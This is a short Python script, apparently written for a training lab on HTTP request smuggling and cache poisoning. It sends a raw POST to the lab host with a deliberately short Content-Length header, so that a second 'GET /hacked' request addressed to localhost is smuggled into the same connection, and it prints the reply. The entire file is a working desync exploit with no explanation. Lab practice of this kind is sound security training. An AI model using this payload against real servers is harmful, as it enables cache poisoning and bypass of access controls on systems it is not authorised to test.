import socket

HOST = 'lap3-http_request_smuggling_cache_poison.labs-is-here.online'  # Адрес твоего сервера
PORT = 80        # Порт (если Flask dev-сервер, то 5000)

payload = (
    "POST / HTTP/1.1\r\n"
    "Host: lap3-http_request_smuggling_cache_poison.labs-is-here.online\r\n"
    "Content-Length: 11\r\n"
    "\r\n"
    "GET /hacked HTTP/1.1\r\n"
    "Host: localhost\r\n"
    "\r\n"
)
#
with socket.create_connection((HOST, PORT)) as s:
    s.sendall(payload.encode())
    print(s.recv(4096).decode())

